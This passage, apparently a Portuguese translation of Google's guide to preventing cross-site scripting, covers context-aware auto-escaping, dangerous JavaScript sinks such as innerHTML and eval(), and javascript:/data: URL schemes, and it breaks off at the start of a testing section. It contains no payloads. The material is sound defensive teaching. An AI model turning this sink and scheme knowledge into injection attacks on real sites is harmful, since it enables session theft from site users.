style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"Auto-escaping" refere-se à capacidade de um sistema de template ou framework de desenvolvimento web para escapar automaticamente da entrada do usuário, a fim de evitar a execução de qualquer script embutido na entrada. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se você quisesse evitar o XSS sem auto-escape, você teria que escapar manualmente da entrada; </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">isso significa escrever seu próprio código personalizado (ou chamar uma função de escape) em todos os lugares em que seu aplicativo inclui dados controlados pelo usuário.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Na maioria dos casos, a entrada de escape manual não é recomendada; </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">discutiremos o escape manual na próxima seção. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"Context-aware" refere-se à capacidade de aplicar diferentes formas de escape com base no contexto apropriado. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Como CSS, HTML, URLs e JavaScript usam sintaxe diferente, diferentes formas de escape são necessárias para cada contexto. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O exemplo de modelo HTML a seguir usa variáveis ​​em todos esses contextos diferentes: </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;body&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;span </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">style</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">"color:{{ "{{" }} USER_COLOR }};"</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;&nbsp;&nbsp;Hello {{ "{{" }} USERNAME }}, view your </span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;a </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">href</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">"{{ "{{" }} USER_ACCOUNT_URL }}"</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">Account</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/a&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/span&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;script&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;&nbsp;&nbsp;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">var</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> id = {{ "{{" }} USER_ID }};</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;&nbsp;&nbsp;alert(</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">"Your user ID is: "</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> + id);</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/script&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/body&gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Como você pode ver, tentar escapar manualmente a entrada para vários contextos pode ser muito difícil. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Você pode ler mais sobre o escape automático com reconhecimento de contexto </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=http://googleonlinesecurity.blogspot.com/2009/03/reducing-xss-by-way-of-automatic.html&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhj3Svy_oWn-fAfV41_A_KcLrV9tkA" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">aqui</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://code.google.com/p/go/source/browse/src/pkg/html/template/doc.go" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Os modelos Go</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> , o </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=http://www.gwtproject.org/doc/latest/DevGuideSecuritySafeHtml.html&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhhb3InZzUh4T4fVxn8vqH1Y_rkK_A" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Google Web Toolkit (GWT) com SafeHtml</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> , os </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://developers.google.com/closure/templates/docs/security&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhgJ21ZGGdt9drncB-deKVWEjzqwkw" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">modelos de fechamento</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> e o </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://code.google.com/p/ctemplate/&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhghOoMkTjpD2RaYiJ0otgcJSOPlVA" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">CTemplate</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> fornecem escape automático com reconhecimento de contexto, para que as variáveis ​​escapem corretamente para o contexto da página em que aparecem.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se você estiver usando modelos para gerar HTML dentro do JavaScript (uma boa ideia!), O </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://developers.google.com/closure/templates/docs/security&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhgJ21ZGGdt9drncB-deKVWEjzqwkw" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Closure Templates</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> e o </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://docs.angularjs.org/misc/faq&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhjUumL65FJ7EdrXFTALMq9M1jB3gQ" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Angular</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> fornecem recursos de escape integrados. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Uma nota sobre a entrada de escape manual </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Escrever seu próprio código para escapar de entrada e, em seguida, aplicá-lo de maneira correta e consistente é extremamente difícil.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Não recomendamos que você escape manualmente dos dados fornecidos pelo usuário.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Em vez disso, recomendamos enfaticamente que você use um sistema de modelo ou uma estrutura de desenvolvimento da Web que forneça escape automático com reconhecimento de contexto. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se isso for impossível para o seu site, use bibliotecas e funções existentes que funcionam e aplique essas funções de forma consistente a todos os dados fornecidos pelo usuário e a todos os dados que não estejam diretamente sob o seu controle. </span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Entenda os comportamentos comuns do navegador que levam ao XSS </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se você seguir as práticas da seção anterior, poderá reduzir o risco de introduzir erros de XSS em seus aplicativos. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Existem, no entanto, formas mais sutis em que o XSS pode surgir. </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para atenuar o risco desses casos, considere o seguinte: </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Especifique o tipo de </span><span style="background-color: white; color: #007000; font-family: &quot;verdana&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">Content-Type</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> e o conjunto de </span><span style="background-color: white; color: #007000; font-family: &quot;verdana&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">charset</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> corretos para todas as respostas que podem conter dados do usuário. </span></div></li></ul><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: circle; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Sem esses cabeçalhos, muitos navegadores tentarão determinar automaticamente a resposta apropriada, executando o </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://code.google.com/p/browsersec/wiki/Part2&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhirkQQ8DYElSdTY7dCHFOoLAWN8pA#Content_handling_mechanisms" style="text-decoration-line: none;"><span style="color: #1155cc; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">conteúdo ou o sniffing do conjunto de caracteres</span></a><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> . Isso pode permitir que a entrada externa engane o navegador para interpretar parte da resposta como marcação HTML, o que, por sua vez, pode levar ao XSS. </span></div></li></ul></ul><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Certifique-se de que todos os URLs fornecidos pelo usuário iniciem com um protocolo seguro. </span></div></li><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: circle; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Geralmente, é necessário usar URLs fornecidas pelos usuários, por exemplo, como uma URL de continuação para redirecionar após uma determinada ação ou em um link para um recurso especificado pelo usuário. Se o protocolo da URL for controlado pelo usuário, o navegador poderá interpretá-lo como um URI de script (por exemplo, javascript: data: e outros) e executá-lo. &nbsp;Para evitar isso, sempre verifique se o URL começa com um valor permitido (geralmente apenas http:// ou https:// ). </span></div></li></ul></ul><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Host user-uploaded files em um sandbox</span></div></li></ul></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Conheça as melhores práticas para sua tecnologia </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">As práticas recomendadas a seguir podem ajudar você a reduzir as vulnerabilidades de XSS em seu código para tecnologias específicas. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">JavaScript</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> : Muitas vulnerabilidades do XSS são causadas pela passagem de dados do usuário para coletores de execução de Javascript; JavaScript: mecanismos de navegador que executarão scripts a partir de suas entradas. Tais APIs incluem *.innerHTML , document.write e eval() . Quando os dados controlados pelo usuário (na forma de location.* , document.cookie ou JavaScript variáveis ​​contendo dados do usuário) são retornados pelo servidor, chamar essas funções pode levar ao XSS. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">JSON</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> : Certifique-se de aplicar o escape adequado (incluindo o escape de caracteres HTML como &lt; e &gt; ). Não permita que os dados fornecidos pelo usuário sejam retornados como a primeira parte da resposta (como acontece com frequência no JSONP). Não use eval() para analisar os dados. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Flash</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> : considere hospedar arquivos SWF em um domínio separado. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">GWT</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> : Siga as diretrizes no </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=http://www.gwtproject.org/doc/latest/DevGuideSecuritySafeHtml.html&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhhb3InZzUh4T4fVxn8vqH1Y_rkK_A" style="text-decoration-line: none;"><span style="color: #1155cc; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Guia do desenvolvedor do GWT sobre SafeHtml</span></a><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. Em particular, evite o uso de APIs que interpretam valores simples de String como HTML e prefiram as variantes SafeHtml quando disponíveis. Por exemplo, prefira HTML#setHTML(SafeHtml)sobre HTML#setHTML(String) . </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">HTML sanitization (Limpeza de HTML) </span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">: se você precisar oferecer suporte a marcação fornecida pelo usuário, como imagens ou links, procure tecnologias que ofereçam suporte ao saneamento de HTML. Por exemplo, o Caja inclui um </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://code.google.com/p/google-caja/wiki/JsHtmlSanitizer&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhi1x5WnrUQT1FZzOZhIrsqe1lHVyQ" style="text-decoration-line: none;"><span style="color: #1155cc; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">html-sanitizer</span></a><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> escrito em Javascript que pode ser usado para remover JavaScript potencialmente executável de um fragmento de HTML. </span></div></li></ul></h1><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Teste para XSS</span></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Prossiga com cuidado</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Como em qualquer teste de segurança, pode haver efeitos colaterais indesejados. Não assumimos nenhuma responsabilidade pelo uso que você faz do conhecimento que obtém aqui (com o poder vem a responsabilidade); então, use esta informação por sua conta e risco.</span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Como posso testar o XSS?</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Não há mágica para detectar XSS em aplicativos. A melhor maneira de testar os erros do XSS é através de uma combinação de: </span></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; 